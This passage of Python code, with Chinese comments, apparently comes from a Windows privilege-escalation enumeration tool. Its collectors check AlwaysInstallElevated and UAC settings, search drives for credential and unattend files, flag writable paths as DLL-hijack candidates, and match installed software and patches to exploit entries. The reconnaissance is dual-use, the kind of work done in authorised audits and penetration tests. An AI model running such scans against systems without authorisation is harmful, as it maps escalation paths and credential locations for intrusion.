                                self._autostart_info.run_keys.append(entry)
                            i += 1
                        except OSError:
                            break
                finally:
                    winreg.CloseKey(key)
            except OSError:
                pass

    async def _collect_always_install_elevated(self) -> None:
        """检查AlwaysInstallElevated注册表键"""
        try:
            for hkey, access, label in [
                (winreg.HKEY_LOCAL_MACHINE, KEY_WOW64_64KEY, "HKLM"),
                (winreg.HKEY_CURRENT_USER, 0, "HKCU"),
            ]:
                try:
                    key = winreg.OpenKey(
                        hkey,
                        r"SOFTWARE\Policies\Microsoft\Windows\Installer",
                        0, winreg.KEY_READ | access,
                    )
                    try:
                        val = int(winreg.QueryValueEx(key, "AlwaysInstallElevated")[0])
                        if label == "HKLM":
                            self._autostart_info.always_install_elevated_hklm = val
                        else:
                            self._autostart_info.always_install_elevated_hkcu = val
                    except OSError:
                        pass
                    winreg.CloseKey(key)
                except OSError:
                    pass

            self._autostart_info.always_install_elevated = (
                self._autostart_info.always_install_elevated_hklm == 1 and
                self._autostart_info.always_install_elevated_hkcu == 1
            )
        except Exception as e:
            logger.debug(f"AlwaysInstallElevated检查失败: {e}")

    async def _collect_uac_config(self) -> None:
        """收集UAC配置"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                0, winreg.KEY_READ | KEY_WOW64_64KEY,
            )
            try:
                self._autostart_info.uac_enable_lua = int(
                    winreg.QueryValueEx(key, "EnableLUA")[0])
            except OSError:
                pass
            try:
                self._autostart_info.uac_level = int(
                    winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")[0])
            except OSError:
                pass
            try:
                self._autostart_info.uac_consent_prompt_behavior = int(
                    winreg.QueryValueEx(key, "ConsentPromptBehaviorUser")[0])
            except OSError:
                pass
            winreg.CloseKey(key)
        except Exception as e:
            logger.debug(f"UAC配置收集失败: {e}")

    async def _collect_startup_folder(self) -> None:
        """收集启动文件夹内容"""
        startup_paths = [
            os.path.join(os.environ.get("ALLUSERSPROFILE", "C:\\ProgramData"),
                         "Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
            os.path.join(os.environ.get("APPDATA", ""),
                         "Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
        ]
        for sp in startup_paths:
            if os.path.exists(sp):
                try:
                    for item in os.listdir(sp):
                        full_path = os.path.join(sp, item)
                        self._autostart_info.startup_folder_items.append(full_path)
                except Exception:
                    pass


class FileSystemCollector:
    """文件系统与敏感文件收集器

    检查:
    - 常用敏感目录权限
    - 当前用户可写的系统路径（DLL劫持候选）
    - 可能包含凭据的配置文件
    """

    def __init__(self) -> None:
        self._fs_info = FileSystemInfo()

    async def collect(self) -> FileSystemInfo:
        """异步收集文件系统信息

        Returns:
            FileSystemInfo: 文件系统信息对象
        """
        tasks = [
            self._check_writable_system_paths(),
            self._search_credential_files(),
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._fs_info

    async def _check_writable_system_paths(self) -> None:
        """检查可写系统路径"""
        for path in DLL_HIJACK_CANDIDATE_PATHS:
            if os.path.exists(path) and _check_directory_writable(path):
                self._fs_info.writable_system_paths.append(path)
                self._fs_info.dll_hijack_candidates.append(path)

    async def _search_credential_files(self) -> None:
        """搜索可能包含凭据的配置文件"""
        search_roots = [
            os.environ.get("SYSTEMDRIVE", "C:") + "\\",
            os.path.join(os.environ.get("SYSTEMDRIVE", "C:"), "Users"),
            os.path.join(os.environ.get("SYSTEMDRIVE", "C:"), "inetpub"),
            os.path.join(os.environ.get("SYSTEMDRIVE", "C:"), "xampp"),
        ]

        for root in search_roots:
            if not os.path.exists(root):
                continue
            for pattern in CREDENTIAL_FILE_PATTERNS:
                try:
                    full_path = os.path.join(root, pattern)
                    if os.path.exists(full_path):
                        self._fs_info.credential_files_found.append(full_path)
                        if "unattend" in pattern.lower() or "sysprep" in pattern.lower():
                            self._fs_info.unattend_files.append(full_path)
                        if any(kw in pattern.lower() for kw in
                               ["config", "credential", "ini", "xml", "json", "env"]):
                            self._fs_info.config_files_with_creds.append(full_path)
                except Exception:
                    continue

        for env_var in ["USERPROFILE", "APPDATA", "LOCALAPPDATA", "HOMEPATH"]:
            user_path = os.environ.get(env_var, "")
            if user_path and os.path.exists(user_path):
                for pattern in CREDENTIAL_FILE_PATTERNS:
                    try:
                        full_path = os.path.join(user_path, pattern)
                        if os.path.exists(full_path):
                            if full_path not in self._fs_info.credential_files_found:
                                self._fs_info.credential_files_found.append(full_path)
                    except Exception:
                        continue


class NetworkCollector:
    """网络信息收集器

    收集:
    - 当前TCP/UDP监听端口及对应进程
    - 端口转发规则
    - 网络接口信息
    """

    def __init__(self) -> None:
        self._net_info = NetworkInfo()

    async def collect(self) -> NetworkInfo:
        """异步收集网络信息

        Returns:
            NetworkInfo: 网络信息对象
        """
        tasks = [
            self._collect_listening_ports(),
            self._collect_port_forwarding(),
            self._collect_network_interfaces(),
            self._collect_dns_proxy(),
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._net_info

    async def _collect_listening_ports(self) -> None:
        """收集监听端口"""
        try:
            output = _run_cmd("netstat -ano | findstr LISTENING", timeout=10.0)
            if output:
                for line in output.split("\n"):
                    line_stripped = line.strip()
                    if not line_stripped:
                        continue
                    parts = line_stripped.split()
                    if len(parts) >= 5:
                        local_addr = parts[1]
                        pid = parts[-1]
                        if ":" in local_addr:
                            port = local_addr.rsplit(":", 1)[-1]
                            try:
                                port_int = int(port)
                                self._net_info.listening_tcp_ports.append({
                                    "port": port_int,
                                    "address": local_addr,
                                    "pid": pid,
                                })
                            except ValueError:
                                pass

            output = _run_cmd("netstat -ano | findstr UDP", timeout=10.0)
            if output:
                for line in output.split("\n"):
                    line_stripped = line.strip()
                    if not line_stripped:
                        continue
                    parts = line_stripped.split()
                    if len(parts) >= 4:
                        local_addr = parts[1]
                        pid = parts[-1]
                        if ":" in local_addr:
                            port = local_addr.rsplit(":", 1)[-1]
                            try:
                                port_int = int(port)
                                self._net_info.listening_udp_ports.append({
                                    "port": port_int,
                                    "address": local_addr,
                                    "pid": pid,
                                })
                            except ValueError:
                                pass

        except Exception as e:
            logger.debug(f"监听端口收集失败: {e}")

    async def _collect_port_forwarding(self) -> None:
        """收集端口转发规则"""
        try:
            output = _run_cmd("netsh interface portproxy show all", timeout=10.0)
            if output and "没有" not in output and "No" not in output:
                for line in output.split("\n"):
                    line_stripped = line.strip()
                    if line_stripped and ":" in line_stripped:
                        self._net_info.port_forwarding_rules.append({
                            "rule": line_stripped,
                        })
        except Exception as e:
            logger.debug(f"端口转发收集失败: {e}")

    async def _collect_network_interfaces(self) -> None:
        """收集网络接口信息"""
        try:
            output = _run_cmd("ipconfig /all", timeout=10.0)
            if output:
                current_interface: Dict[str, Any] = {}
                for line in output.split("\n"):
                    line_stripped = line.strip()
                    if not line_stripped:
                        if current_interface:
                            self._net_info.network_interfaces.append(current_interface)
                            current_interface = {}
                        continue
                    if "适配器" in line_stripped or "adapter" in line_stripped.lower():
                        if current_interface:
                            self._net_info.network_interfaces.append(current_interface)
                        current_interface = {"name": line_stripped.rstrip(":")}
                    elif ":" in line_stripped and current_interface is not None:
                        key, _, val = line_stripped.partition(":")
                        current_interface[key.strip()] = val.strip()
                if current_interface:
                    self._net_info.network_interfaces.append(current_interface)
        except Exception as e:
            logger.debug(f"网络接口收集失败: {e}")

    async def _collect_dns_proxy(self) -> None:
        """收集DNS和代理设置"""
        try:
            output = _run_cmd("nslookup 127.0.0.1 2>&1", timeout=5.0)
            if output:
                for line in output.split("\n"):
                    if "Address:" in line and "127.0.0.1" not in line:
                        addr = line.split(":", 1)[-1].strip()
                        if addr and addr not in self._net_info.dns_servers:
                            self._net_info.dns_servers.append(addr)

            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings",
                    0, winreg.KEY_READ,
                )
                try:
                    self._net_info.proxy_settings["ProxyEnable"] = str(
                        winreg.QueryValueEx(key, "ProxyEnable")[0])
                except OSError:
                    pass
                try:
                    self._net_info.proxy_settings["ProxyServer"] = str(
                        winreg.QueryValueEx(key, "ProxyServer")[0])
                except OSError:
                    pass
                winreg.CloseKey(key)
            except OSError:
                pass

        except Exception as e:
            logger.debug(f"DNS/代理收集失败: {e}")


class SoftwareCollector:
    """已安装软件收集器

    枚举所有已安装软件版本并与内置过时版本列表对比。
    """

    def __init__(self) -> None:
        self._sw_info = SoftwareInfo()

    async def collect(self) -> SoftwareInfo:
        """异步收集已安装软件信息

        Returns:
            SoftwareInfo: 软件信息对象
        """
        await self._enumerate_installed_software()
        await self._check_outdated_software()
        return self._sw_info

    async def _enumerate_installed_software(self) -> None:
        """枚举已安装软件"""
        uninstall_keys = [
            (winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
             KEY_WOW64_64KEY),
            (winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
             KEY_WOW64_32KEY),
            (winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
             0),
        ]

        seen: Set[str] = set()
        for hkey, subkey, access in uninstall_keys:
            try:
                key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ | access)
                try:
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            i += 1
                            try:
                                sub = winreg.OpenKey(
                                    key, subkey_name, 0, winreg.KEY_READ | access)
                                try:
                                    display_name = str(winreg.QueryValueEx(
                                        sub, "DisplayName")[0])
                                    display_version = ""
                                    try:
                                        display_version = str(winreg.QueryValueEx(
                                            sub, "DisplayVersion")[0])
                                    except OSError:
                                        pass

                                    if display_name and display_name not in seen:
                                        seen.add(display_name)
                                        self._sw_info.installed_software.append({
                                            "name": display_name,
                                            "version": display_version,
                                        })
                                finally:
                                    winreg.CloseKey(sub)
                            except OSError:
                                continue
                        except OSError:
                            break
                finally:
                    winreg.CloseKey(key)
            except OSError:
                continue

        self._sw_info.total_installed = len(self._sw_info.installed_software)

    async def _check_outdated_software(self) -> None:
        """检查过时软件"""
        for sw in self._sw_info.installed_software:
            sw_name = sw.get("name", "")
            sw_version = sw.get("version", "")

            for kb_name, kb_info in OUTDATED_SOFTWARE_KB.items():
                if kb_name.lower() in sw_name.lower():
                    for vuln_ver in kb_info.get("vulnerable_versions", []):
                        if vuln_ver in sw_version or sw_version.startswith(vuln_ver):
                            finding: Dict[str, Any] = {
                                "software": sw_name,
                                "installed_version": sw_version,
                                "vulnerable_version": vuln_ver,
                                "exploit": kb_info.get("exploit", ""),
                                "risk": kb_info.get("risk", 0),
                            }
                            self._sw_info.outdated_software.append(finding)
                            break


# =============================================================================
# 主收集器 - 统一调度
# =============================================================================

class PrivescCollector:
    """Windows提权信息收集主控

    统一调度所有子收集器，异步并发执行，汇总结果。

    Attributes:
        _os_collector: 操作系统信息收集器
        _user_collector: 用户与权限收集器
        _patch_collector: 补丁收集器
        _service_collector: 服务枚举收集器
        _autostart_collector: 自启动收集器
        _fs_collector: 文件系统收集器
        _net_collector: 网络收集器
        _sw_collector: 软件收集器
        _quick_mode: 是否快速模式
    """

    def __init__(self, quick_mode: bool = False) -> None:
        """初始化提权信息收集器

        Args:
            quick_mode: 是否快速模式（仅检查高危向量）
        """
        self._quick_mode = quick_mode
        self._os_collector = OSInfoCollector()
        self._user_collector = UserInfoCollector()
        self._patch_collector = PatchCollector()
        self._service_collector = ServiceCollector()
        self._autostart_collector = AutostartCollector()
        self._fs_collector = FileSystemCollector()
        self._net_collector = NetworkCollector()
        self._sw_collector = SoftwareCollector()

    async def collect_full(self) -> PrivescCollectionResult:
        """执行完整提权信息收集

        并发执行所有子收集器，汇总结果。

        Returns:
            PrivescCollectionResult: 完整收集结果
        """
        start_time = time.time()
        result = PrivescCollectionResult(
            timestamp=datetime.now().isoformat(),
            hostname=platform.node(),
        )

        collectors = [
            ("os_info", self._os_collector.collect()),
            ("user_info", self._user_collector.collect()),
            ("patch_info", self._patch_collector.collect()),
            ("service_info", self._service_collector.collect()),
            ("autostart_info", self._autostart_collector.collect()),
            ("filesystem_info", self._fs_collector.collect()),
            ("network_info", self._net_collector.collect()),
            ("software_info", self._sw_collector.collect()),
        ]

        tasks = []
        for field_name, coro in collectors:
            tasks.append(self._safe_collect(field_name, coro, result))

        await asyncio.gather(*tasks, return_exceptions=True)

        result.collection_duration = round(time.time() - start_time, 2)
        return result

    async def collect_quick(self) -> PrivescCollectionResult:
        """快速模式收集 - 仅检查高危向量

        跳过文件系统和软件枚举，聚焦于:
        - 用户权限与令牌
        - 补丁缺失（高危CVE）
        - 服务配置错误
        - AlwaysInstallElevated

        Returns:
            PrivescCollectionResult: 快速收集结果
        """
        start_time = time.time()
        result = PrivescCollectionResult(
            timestamp=datetime.now().isoformat(),
            hostname=platform.node(),
        )

        quick_collectors = [
            ("os_info", self._os_collector.collect()),
            ("user_info", self._user_collector.collect()),
            ("patch_info", self._patch_collector.collect()),
            ("service_info", self._service_collector.collect()),
            ("autostart_info", self._autostart_collector.collect()),
        ]

        tasks = []
        for field_name, coro in quick_collectors:
            tasks.append(self._safe_collect(field_name, coro, result))

        await asyncio.gather(*tasks, return_exceptions=True)

        result.collection_duration = round(time.time() - start_time, 2)
        return result

    async def check_specific_cve(self, cve_id: str) -> Dict[str, Any]:
        """检查特定CVE是否可利用

        Args:
            cve_id: CVE编号（如 CVE-2021-36934）

        Returns:
            检查结果字典
        """
        cve_info = CVE_KNOWLEDGE_BASE.get(cve_id)
        if not cve_info:
            return {"cve_id": cve_id, "found": False, "error": "CVE不在知识库中"}

        await self._patch_collector._collect_installed_patches()
        installed_set = set(self._patch_collector._patch_info.installed_patches)

        patch_kbs = cve_info.get("patch_kb", [])
        is_patched = any(kb in installed_set for kb in patch_kbs)

        return {
            "cve_id": cve_id,
            "found": True,
            "title": cve_info.get("title", ""),
            "description": cve_info.get("description", ""),
            "severity": cve_info.get("severity", ""),
            "cvss": cve_info.get("cvss", 0),
            "is_patched": is_patched,
            "is_exploitable": not is_patched,
            "missing_patches": [kb for kb in patch_kbs if kb not in installed_set],
            "exploit_method": cve_info.get("exploit_method", ""),
            "exploit_command": cve_info.get("exploit_command", ""),
            "expected_result": cve_info.get("expected_result", ""),
            "risk_note": cve_info.get("risk_note", ""),
            "reference": cve_info.get("reference", ""),
            "risk_score": cve_info.get("risk_score", 0) if not is_patched else 0,
        }

    async def _safe_collect(
        self, field_name: str, coro: Any, result: PrivescCollectionResult,
    ) -> None:
        """安全执行收集任务，捕获异常

        Args:
            field_name: 结果字段名
            coro: 协程对象
            result: 结果对象
        """
        try:
            value = await coro
            setattr(result, field_name, value)
        except Exception as e:
            error_msg = f"{field_name} 收集失败: {e}"
            logger.error(error_msg, exc_info=True)
            result.errors.append(error_msg)


